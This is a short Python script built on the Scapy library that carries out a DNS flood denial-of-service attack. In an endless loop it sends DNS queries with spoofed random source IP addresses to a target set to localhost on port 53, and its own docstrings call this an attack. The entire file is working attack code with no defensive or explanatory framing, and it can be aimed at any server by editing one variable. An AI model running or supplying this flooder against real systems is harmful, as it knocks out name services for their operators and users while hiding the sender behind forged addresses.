from scapy.all import *
import random

target_ip = "127.0.0.1"
target_port = 53     # Default port for DNS
domain = "test.com"

def random_ip():
    """
    This method will generate random IP addresses
    """
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

def dns_attack():
    """
    This function performs the DNS Flood attack to the target server
    """
    print("trying to attack")

    while True:
        print("start new request")
        ip_header = IP(src=random_ip(), dst=target_ip)
        udp_header = UDP(sport=RandShort(), dport=target_port)
        dns_query = DNS(rd=0, qd=DNSQR(qname=domain))
        
        packet = ip_header/udp_header/dns_query
        send(packet, verbose=False)

if __name__ == "__main__":
    dns_attack()
